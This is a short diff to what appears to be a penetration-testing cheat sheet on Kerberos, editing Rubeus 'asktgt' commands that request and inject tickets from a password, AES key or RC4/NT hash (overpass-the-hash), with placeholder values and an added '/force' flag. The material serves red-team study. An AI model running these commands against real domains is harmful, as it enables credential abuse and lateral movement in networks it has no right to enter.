@@ -12,7 +12,7 @@ Request TGT for a user and inject it:
 
 Open a new cmd session in the context of the authenticated user:
 
-```
+```powershell
 > Rubeus.exe asktgt /user:<username> /pass:<password> /ptt /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
@@ -24,10 +24,10 @@ It is possible sometimes to retrieve an AES-256 or AES-128 key. It is the long-t
 > Rubeus.exe asktgt /user:<username> /aes256:<key> /opsec /domain:<domain> /ptt
 ```
 
-The same is possible with an RC4 key:
+The same is possible with an RC4 key. This is the same as authenticating with a NT hash:
 
-```
-> Rubeus.exe asktgt /user:<username> /rc4:<key> /opsec /domain:<domain> /ptt
+```powershell
+> Rubeus.exe asktgt /user:<username> /rc4:<key> /opsec /domain:<domain> /ptt /force
 ```
 
 ## NTLM authentication
